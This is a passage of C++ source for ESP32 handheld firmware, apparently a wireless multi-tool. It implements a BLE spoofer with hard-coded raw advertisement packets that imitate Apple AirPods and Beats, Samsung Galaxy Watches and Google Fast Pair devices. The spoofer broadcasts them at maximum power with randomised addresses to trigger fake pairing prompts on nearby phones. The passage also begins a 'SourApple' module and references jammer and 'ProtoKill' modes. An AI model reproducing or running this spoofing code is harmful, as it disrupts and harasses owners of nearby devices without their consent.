#include "SettingsStore.h"
#include "Touchscreen.h"
#include "config.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "icon.h"
#include "shared.h"
#include "StatusLedService.h"
#include "utils.h"

#ifdef TFT_BLACK
#undef TFT_BLACK
#endif
#define TFT_BLACK FEATURE_BG

#ifndef FEATURE_TEXT
#define FEATURE_TEXT ORANGE
#endif
#ifndef FEATURE_WHITE
#define FEATURE_WHITE 0xFFFF
#endif

#ifdef TFT_WHITE
#undef TFT_WHITE
#endif
#define TFT_WHITE FEATURE_TEXT

#ifdef WHITE
#undef WHITE
#endif
#define WHITE FEATURE_WHITE

#ifdef DARK_GRAY
#undef DARK_GRAY
#endif
#define DARK_GRAY UI_FG

static constexpr int kBleScreenH = 320;

static int bleContentBottom() {
  return featureHasTouchNavBar() ? touchNavContentBottomY() : kBleScreenH;
}

static int bleMaxLinesInZone(int contentTop, int lineHeight) {
  const int h = bleContentBottom() - contentTop;
  if (h <= 0 || lineHeight <= 0) {
    return 1;
  }
  return h / lineHeight;
}

static void bleClearBody(uint16_t color = TFT_BLACK) {
  if (featureHasTouchNavBar()) {
    featureClearContent(color);
  } else {
    tft.fillScreen(color);
  }
}

static void bleSetExitOnlyNavLabels() {
  setTouchNavLabels(nullptr, nullptr, "Exit", nullptr, nullptr);
}

static void bleSetJammerNavLabels() {
  setTouchNavLabels("Mode-", nullptr, "Exit", "Toggle", "Mode+");
}

static void bleSetScannerNavLabels() {
  setTouchNavLabels("Cal", "Scan", "Exit", nullptr, nullptr);
}

static constexpr unsigned long kBleNavDebounceMs = 200;

static void bleWaitButtonRelease(int pin) {
  while (isButtonPressed(pin)) {
    delay(10);
  }
  delay(kBleNavDebounceMs);
}

static void bleWaitNavRelease(int pin1, int pin2 = -1, int pin3 = -1) {
  while (isButtonPressed(pin1) ||
         (pin2 >= 0 && isButtonPressed(pin2)) ||
         (pin3 >= 0 && isButtonPressed(pin3))) {
    delay(10);
  }
  delay(kBleNavDebounceMs);
}

namespace Scanner { void scannerHandleNavButtons(); }
namespace ProtoKill { void prokillHandleNavButtons(); }

static void bleSetSpooferNavLabels() {
  setTouchNavLabels("Prev", "Type", "Exit", "Power", "Next");
}

namespace BleSpoofer {

#define SCREEN_HEIGHT 250
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String spooferBuffer[MAX_LINES];
uint16_t colorspooferBuffer[MAX_LINES];
int spooferlineIndex = 0;

static bool uiDrawn = false;

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 5

static int iconX[ICON_NUM] = {90, 130, 170, 210, 10};
static int iconY = STATUS_BAR_Y_OFFSET;

BLEAdvertising *pAdvertising;
std::string devices_uuid = "00003082-0000-1000-9000-00805f9b34fb";

uint32_t delayMillisecond = 1000;
unsigned long lastDebounceTimeNext = 0;
unsigned long lastDebounceTimePrev = 0;
unsigned long lastDebounceTimeAdvNext = 0;
unsigned long lastDebounceTimeAdvPrev = 0;

int lastButtonStateNext = LOW;
int lastButtonStatePrev = LOW;
int lastButtonStateAdvNext = LOW;
int lastButtonStateAdvPrev = LOW;

unsigned long lastDebounceTime = 0;
unsigned long debounceDelay = 500;

bool isAdvertising = false;

int scanTime = 5;
int deviceType = 1;
int delaySeconds = 1;
int advType = 1;
int attack_state = 1;
int device_choice = 0;
int device_index = 0;

// Samsung devices (15 bytes)
struct WatchModel {
  uint8_t value;
  const char* name;
};
const WatchModel samsungModels[] = {
  {0x01, "Galaxy Watch 4"},
  {0x02, "Galaxy Watch 5"},
  {0x03, "Galaxy Watch 6"}
};
const uint8_t samsungModelCount = 3;
const uint8_t SAMSUNG_ADV_SIZE = 15;
const uint16_t SAMSUNG_COMPANY_ID = 0x0075;
const uint8_t SAMSUNG_ADV_TEMPLATE[SAMSUNG_ADV_SIZE] = {
  14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00
};

// Google device (14 bytes, single model)
const uint8_t GOOGLE_ADV_SIZE = 14;
const uint16_t GOOGLE_FAST_PAIR_ID = 0xFE2C;
const uint8_t GOOGLE_ADV_TEMPLATE[GOOGLE_ADV_SIZE] = {
  0x03, 0x03, 0x2C, 0xFE, // Complete 16-bit Service UUIDs
  0x06, 0x16, 0x2C, 0xFE, 0x00, 0xB7, 0x27, // Service Data
  0x02, 0x0A, 0x00 // TX Power (placeholder, set dynamically)
};

const uint8_t DEVICES[][31] = {
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};

bool generateSamsungAdvPacket(uint8_t modelIndex, BLEAdvertisementData& advData) {
  if (modelIndex >= samsungModelCount) return false;
  uint8_t advDataRaw[SAMSUNG_ADV_SIZE];
  memcpy(advDataRaw, SAMSUNG_ADV_TEMPLATE, SAMSUNG_ADV_SIZE);
  advDataRaw[SAMSUNG_ADV_SIZE - 1] = samsungModels[modelIndex].value;
  advData.addData(std::string((char*)advDataRaw, SAMSUNG_ADV_SIZE));
  return true;
}

bool generateGoogleAdvPacket(BLEAdvertisementData& advData) {
  uint8_t advDataRaw[GOOGLE_ADV_SIZE];
  memcpy(advDataRaw, GOOGLE_ADV_TEMPLATE, GOOGLE_ADV_SIZE);
  advDataRaw[GOOGLE_ADV_SIZE - 1] = (uint8_t)(random(121) - 100);
  advData.addData(std::string((char*)advDataRaw, GOOGLE_ADV_SIZE));
  return true;
}

BLEAdvertisementData getAdvertismentData() {
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  if (device_choice == 0) { // Apple
    oAdvertisementData.addData(std::string((char*)DEVICES[device_index], 31));
  } else if (device_choice == 1) { // Samsung
    uint8_t samsungIndex = device_index;
    generateSamsungAdvPacket(samsungIndex, oAdvertisementData);
  } else if (device_choice == 2) { // Google
    generateGoogleAdvPacket(oAdvertisementData);
  }

  return oAdvertisementData;
}

static constexpr int SPOOFER_LOG_TOP = 45;

static int spooferPanelTop() {
  const int panelH = featureHasTouchNavBar() ? 27 : 50;
  return bleContentBottom() - panelH;
}

static int spooferLogBottom() {
  return spooferPanelTop();
}

static int spooferVisibleLines() {
  const int h = spooferLogBottom() - SPOOFER_LOG_TOP;
  if (h <= 0) {
    return 1;
  }
  return h / LINE_HEIGHT;
}

static bool spooferLineFits(int yPos) {
  return yPos + LINE_HEIGHT <= spooferLogBottom();
}

void Printspoofer(String text, uint16_t color, bool extraSpace = false) {
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  const int visibleLines = spooferVisibleLines();
  if (spooferlineIndex >= visibleLines) {
    for (int i = 0; i < visibleLines - 1; i++) {
      spooferBuffer[i] = spooferBuffer[i + 1];
      colorspooferBuffer[i] = colorspooferBuffer[i + 1];
    }
    spooferlineIndex = visibleLines - 1;
  }

  spooferBuffer[spooferlineIndex] = text;
  colorspooferBuffer[spooferlineIndex] = color;
  spooferlineIndex++;

  if (extraSpace && spooferlineIndex < visibleLines) {
    spooferBuffer[spooferlineIndex] = "";
    colorspooferBuffer[spooferlineIndex] = TFT_WHITE;
    spooferlineIndex++;
  }

  for (int i = 0; i < spooferlineIndex && i < visibleLines; i++) {
    int yPos = i * LINE_HEIGHT + SPOOFER_LOG_TOP;
    if (!spooferLineFits(yPos)) {
      continue;
    }

    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);

    tft.setTextColor(colorspooferBuffer[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(spooferBuffer[i]);
  }
}

void sppferLoadingBar(int step) {
  int totalSteps = 4;
  int filledBlocks = (step * 20) / totalSteps;

  String bar = "[";
  for (int i = 0; i < 20; i++) {
    bar += (i < filledBlocks) ? "#" : "_";
  }
  bar += "]";

  Printspoofer(bar, TFT_GREEN);
}

static int s_spooferPanelLastTop = -1;
static int s_spooferPanelLastH = -1;
static int s_lastSpooferDevice = -1;
static int s_lastSpooferAdv = -1;
static bool s_spooferChromeReady = false;

static constexpr int SPOOFER_VALUE_X = 58;
static constexpr int SPOOFER_VALUE_W = 178;

static void spooferResetPanelCache() {
  s_spooferChromeReady = false;
  s_lastSpooferDevice = -1;
  s_lastSpooferAdv = -1;
  s_spooferPanelLastTop = -1;
  s_spooferPanelLastH = -1;
}

static const char* spooferDeviceLabel(int type) {
  switch (type) {
    case 1: return "Airpods";
    case 2: return "Airpods Pro";
    case 3: return "Airpods Max";
    case 4: return "Airpods Gen 2";
    case 5: return "Airpods Gen 3";
    case 6: return "Airpods Pro Gen 2";
    case 7: return "PowerBeats";
    case 8: return "PowerBeats Pro";
    case 9: return "Beats Solo Pro";
    case 10: return "Beats Buds";
    case 11: return "Beats Flex";
    case 12: return "BeatsX";
    case 13: return "Beats Solo3";
    case 14: return "Beats Studio3";
    case 15: return "Beats StudioPro";
    case 16: return "Beats FitPro";
    case 17: return "Beats BudsPlus";
    case 18: return "Galaxy Watch 4";
    case 19: return "Galaxy Watch 5";
    case 20: return "Galaxy Watch 6";
    case 21: return "Google Smart Ctrl";
    default: return "Airpods";
  }
}

static const char* spooferAdvLabel(int type) {
  switch (type) {
    case 1: return "IND";
    case 2: return "DIRECT HIGH";
    case 3: return "SCAN";
    case 4: return "NONCONN";
    case 5: return "DIRECT LOW";
    default: return "IND";
  }
}

static String spooferFitText(const char* text, int maxWidth) {
  String out = text;
  tft.setTextSize(1);
  if (tft.textWidth(out) <= maxWidth) {
    return out;
  }
  while (out.length() > 1 && tft.textWidth(out + "...") > maxWidth) {
    out.remove(out.length() - 1);
  }
  if (!out.isEmpty()) {
    out += "...";
  }
  return out;
}

static void spooferDrawValueWell(int y, int h, const char* text) {
  tft.fillRect(SPOOFER_VALUE_X, y, SPOOFER_VALUE_W, h, DARK_GRAY);
  tft.drawRect(SPOOFER_VALUE_X, y, SPOOFER_VALUE_W, h, DARK_GRAY);

  const String fitted = spooferFitText(text, SPOOFER_VALUE_W - 8);
  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, DARK_GRAY);
  tft.setCursor(SPOOFER_VALUE_X + 4, y + ((h - 8) / 2));
  tft.print(fitted);
}

static void spooferLayoutRows(int panelTop, int panelH, int& row1Y, int& row2Y, int& rowH,
                              const char*& advCaption) {
  if (panelH >= 36) {
    rowH = 14;
    row1Y = panelTop + 3;
    row2Y = panelTop + 18;
    advCaption = "Adv Type:";
  } else {
    rowH = 10;
    row1Y = panelTop + 2;
    row2Y = panelTop + 13;
    advCaption = "Adv:";
  }
}

void updateSpoofer() {
  const int panelTop = spooferPanelTop();
  const int panelH = bleContentBottom() - panelTop;
  if (panelTop < 40 || panelH <= 0) {
    return;
  }

  int row1Y = 0;
  int row2Y = 0;
  int rowH = 0;
  const char* advCaption = "Adv Type:";
  spooferLayoutRows(panelTop, panelH, row1Y, row2Y, rowH, advCaption);

  const bool layoutChanged =
    (panelTop != s_spooferPanelLastTop || panelH != s_spooferPanelLastH);
  const bool needChrome = !s_spooferChromeReady || layoutChanged;
  const bool deviceChanged = (deviceType != s_lastSpooferDevice);
  const bool advChanged = (advType != s_lastSpooferAdv);

  if (!needChrome && !deviceChanged && !advChanged) {
    return;
  }

  if (needChrome) {
    tft.drawFastHLine(0, panelTop - 1, 240, UI_LINE);
    tft.fillRect(0, panelTop, 240, panelH, DARK_GRAY);

    tft.setTextSize(1);
    tft.setTextColor(TFT_WHITE, DARK_GRAY);
    tft.setCursor(5, row1Y + ((rowH - 8) / 2));
    tft.print("Device:");
    tft.setCursor(5, row2Y + ((rowH - 8) / 2));
    tft.print(advCaption);

    s_spooferChromeReady = true;
    s_spooferPanelLastTop = panelTop;
    s_spooferPanelLastH = panelH;
    s_lastSpooferDevice = -1;
    s_lastSpooferAdv = -1;
  }

  if (needChrome || deviceChanged) {
    spooferDrawValueWell(row1Y, rowH, spooferDeviceLabel(deviceType));
    s_lastSpooferDevice = deviceType;
  }

  if (needChrome || advChanged) {
    spooferDrawValueWell(row2Y, rowH, spooferAdvLabel(advType));
    s_lastSpooferAdv = advType;
  }
}

void Airpods() {
  device_choice = 0;
  device_index = 0;
  attack_state = 1;
}

void Airpods_pro() {
  device_choice = 0;
  device_index = 1;
  attack_state = 1;
}

void Airpods_Max() {
  device_choice = 0;
  device_index = 2;
  attack_state = 1;
}

void Airpods_Gen_2() {
  device_choice = 0;
  device_index = 3;
  attack_state = 1;
}

void Airpods_Gen_3() {
  device_choice = 0;
  device_index = 4;
  attack_state = 1;
}

void Airpods_Pro_Gen_2() {
  device_choice = 0;
  device_index = 5;
  attack_state = 1;
}

void Power_Beats() {
  device_choice = 0;
  device_index = 6;
  attack_state = 1;
}

void Power_Beats_Pro() {
  device_choice = 0;
  device_index = 7;
  attack_state = 1;
}

void Beats_Solo_Pro() {
  device_choice = 0;
  device_index = 8;
  attack_state = 1;
}

void Beats_Studio_Buds() {
  device_choice = 0;
  device_index = 9;
  attack_state = 1;
}

void Beats_Flex() {
  device_choice = 0;
  device_index = 10;
  attack_state = 1;
}

void Beats_X() {
  device_choice = 0;
  device_index = 11;
  attack_state = 1;
}

void Beats_Solo_3() {
  device_choice = 0;
  device_index = 12;
  attack_state = 1;
}

void Beats_Studio_3() {
  device_choice = 0;
  device_index = 13;
  attack_state = 1;
}

void Beats_Studio_Pro() {
  device_choice = 0;
  device_index = 14;
  attack_state = 1;
}

void Betas_Fit_Pro() {
  device_choice = 0;
  device_index = 15;
}

void Beats_Studio_Buds_Plus() {
  device_choice = 0;
  device_index = 16;
  attack_state = 1;
}

// Android devices
void Galaxy_Watch_4() {
  device_choice = 1; // Samsung
  device_index = 0;
  attack_state = 1;
}

void Galaxy_Watch_5() {
  device_choice = 1; // Samsung
  device_index = 1;
  attack_state = 1;
}

void Galaxy_Watch_6() {
  device_choice = 1; // Samsung
  device_index = 2;
  attack_state = 1;
}

void Google_Smart_Ctrl() {
  device_choice = 2; // Google
  device_index = 0;
  attack_state = 1;
}

void setAdvertisingData() {

  switch (deviceType) {
    case 1:
      Airpods();
      break;
    case 2:
      Airpods_pro();
      break;
    case 3:
      Airpods_Max();
      break;
    case 4:
      Airpods_Gen_2();
      break;
    case 5:
      Airpods_Gen_3();
      break;
    case 6:
      Airpods_Pro_Gen_2();
      break;
    case 7:
      Power_Beats();
      break;
    case 8:
      Power_Beats_Pro();
      break;
    case 9:
      Beats_Solo_Pro();
      break;
    case 10:
      Beats_Studio_Buds();
      break;
    case 11:
      Beats_Flex();
      break;
    case 12:
      Beats_X();
      break;
    case 13:
      Beats_Solo_3();
      break;
    case 14:
      Beats_Studio_3();
      break;
    case 15:
      Beats_Studio_Pro();
      break;
    case 16:
      Betas_Fit_Pro();
      break;
    case 17:
      Beats_Studio_Buds_Plus();
      break;
    case 18:
      Galaxy_Watch_4();
      break;
    case 19:
      Galaxy_Watch_5();
      break;
    case 20:
      Galaxy_Watch_6();
      break;
    case 21:
      Google_Smart_Ctrl();
      break;
    default:
      Airpods();
      break;
  }
}

void handleButtonPress(int pin, void (*callback)()) {
  static unsigned long lastPressTime[8] = {0};
  static uint8_t lastState[8] = {HIGH, HIGH, HIGH, HIGH, HIGH, HIGH, HIGH, HIGH};

  int index = pin % 8;
  uint8_t currentState = isButtonPressed(pin) ? LOW : HIGH;

  if (currentState == LOW && lastState[index] == HIGH) {
    unsigned long currentTime = millis();

    if ((currentTime - lastPressTime[index]) > debounceDelay) {
      callback();
      lastPressTime[index] = currentTime;
    }
  }

  lastState[index] = currentState;
}

void changeDeviceTypeNext() {
  deviceType++;
  if (deviceType > 21) deviceType = 1;
  Serial.println("Device Type Next: " + String(deviceType));
  setAdvertisingData();
  updateSpoofer();
}

void changeDeviceTypePrev() {
  deviceType--;
  if (deviceType < 1) deviceType = 21;
  Serial.println("Device Type Prev: " + String(deviceType));
  setAdvertisingData();
  updateSpoofer();
}

void changeAdvTypeNext() {
  advType++;
  if (advType > 5) advType = 1;
  Serial.println("Advertising Type Next: " + String(advType));
  setAdvertisingData();
  updateSpoofer();
}

void changeAdvTypePrev() {
  advType--;
  if (advType < 1) advType = 5;
  Serial.println("Advertising Type Prev: " + String(advType));
  setAdvertisingData();
  updateSpoofer();
}

void toggleAdvertising() {
  isAdvertising = !isAdvertising;

  if (!isAdvertising) {
    pAdvertising->stop();
    Serial.println("Advertising stopped.");
    Printspoofer("[!] Advertising stopped", TFT_YELLOW, true);
    updateSpoofer();
  } else {
    if (attack_state == 1) {
      esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
      for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) {
          dummy_addr[i] |= 0xF0;
        }
      }

      BLEAdvertisementData oAdvertisementData = getAdvertismentData();
      pAdvertising->addServiceUUID(devices_uuid);
      pAdvertising->setAdvertisementData(oAdvertisementData);
      pAdvertising->setMinInterval(0x20);
      pAdvertising->setMaxInterval(0x20);
      pAdvertising->setMinPreferred(0x20);
      pAdvertising->setMaxPreferred(0x20);
      pAdvertising->start();

      Printspoofer("[+] Device Type: " + String(deviceType), TFT_WHITE, false);
      Printspoofer("[+] Advertising Type: " + String(advType), TFT_WHITE, false);
      Printspoofer("[!] Advertising started", TFT_YELLOW, false);
    }

    Serial.println("Advertising started.");
    updateSpoofer();
  }
}

void runUI() {

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_sort_down_minus,
    bitmap_icon_sort_up_plus,
    bitmap_icon_key,
    bitmap_icon_power,
    bitmap_icon_go_back
  };

  tft.drawFastHLine(0, 19, 240, UI_LINE);

  if (!uiDrawn) {

    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.fillRect(80, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0: changeDeviceTypePrev(); break;
        case 1: changeDeviceTypeNext(); break;
        case 2: changeAdvTypeNext(); break;
        case 3: toggleAdvertising(); break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
  int x, y;
  if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 4) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void spooferSetup() {
  setTouchButtonInputEnabled(true);
  bleSetSpooferNavLabels();
  spooferResetPanelCache();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  tft.drawFastHLine(0, 19, 240, UI_LINE);

  randomSeed(analogRead(0));
  setupTouchscreen();

  tft.setTextFont(1);
  tft.setTextSize(1);

  tft.fillRect(0, 20, 240, 16, DARK_GRAY);
  tft.setTextFont(1);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(1);
  tft.setCursor(5, 24);

  updateSpoofer();
  runUI();

  Printspoofer("[!!] System Diagnostics", TFT_RED, true);
  redrawTouchButtonBar();

  for (int i = 0; i <= 4; i++) {
    sppferLoadingBar(i);
    delay(random(500));
    redrawTouchButtonBar();
  }

  Printspoofer("[+] System Ready!", TFT_GREEN, true);

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

#if HAS_PCF8574_BUTTONS
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);
#endif

  uiDrawn = false;
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  redrawTouchButtonBar();
}

void spooferLoop() {
  static unsigned long lastUpdate = 0;
  const unsigned long updateInterval = 50;

  unsigned long now = millis();
  if (now - lastUpdate >= updateInterval) {
    lastUpdate = now;

    if (feature_active && isButtonPressed(BTN_SELECT)) {
      feature_exit_requested = true;
      return;
    }

    runUI();
    tft.drawFastHLine(0, 19, 240, UI_LINE);

    handleButtonPress(BTN_RIGHT, changeDeviceTypeNext);
    handleButtonPress(BTN_LEFT, changeDeviceTypePrev);

    handleButtonPress(BTN_DOWN, changeAdvTypeNext);
    handleButtonPress(BTN_UP, toggleAdvertising);
  }
}

void exit() {
  spooferResetPanelCache();

  if (isAdvertising && pAdvertising) {
    pAdvertising->stop();
    isAdvertising = false;
  }
}
}

namespace SourApple {
static bool uiDrawn = false;

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 1

static int iconX[ICON_NUM] = {10};
static int iconY = STATUS_BAR_Y_OFFSET;

std::string device_uuid = "00003082-0000-1000-9000-00805f9b34fb";

BLEAdvertising *Advertising;

uint8_t packet[17];

#define MAX_LINES 30
String lines[MAX_LINES];
int currentLine = 0;
int lineNumber = 1;
const int lineHeight = 14;

void runUI() {

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_go_back
  };

  tft.drawFastHLine(0, 19, 240, UI_LINE);

  if (!uiDrawn) {

    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0: feature_exit_requested = true; break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  static bool s_backIconHeld = false;
  const unsigned long touchCheckInterval = 25;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x = 0;
    int y = 0;
    bool hitBack = false;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              hitBack = true;
            }
            break;
          }
        }
      }
    }
    if (hitBack && !s_backIconHeld) {
      feature_exit_requested = true;
    }
    s_backIconHeld = hitBack;
    lastTouchCheck = millis();
  }
}

void updatedisplay() {
